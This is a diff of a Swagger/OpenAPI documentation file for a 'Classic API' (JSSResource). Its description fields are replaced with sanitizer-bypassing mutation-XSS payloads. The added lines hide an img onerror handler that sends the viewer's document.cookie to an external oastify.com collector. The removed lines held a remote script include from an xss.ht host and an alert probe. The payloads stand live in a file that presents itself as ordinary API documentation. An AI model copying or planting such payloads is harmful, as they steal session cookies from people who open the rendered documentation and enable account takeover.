@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script src=https://moblig.xss.ht></script> src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='http://2gjira4g2m20q01c9ertff6zgqmha87ww.oastify.com/?'%2bencodeURIComponent(document.cookie)> src=1>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='http://2gjira4g2m20q01c9ertff6zgqmha87ww.oastify.com/?'%2bencodeURIComponent(document.cookie)> src=1>"></form>
 
           format: int64
           in: path
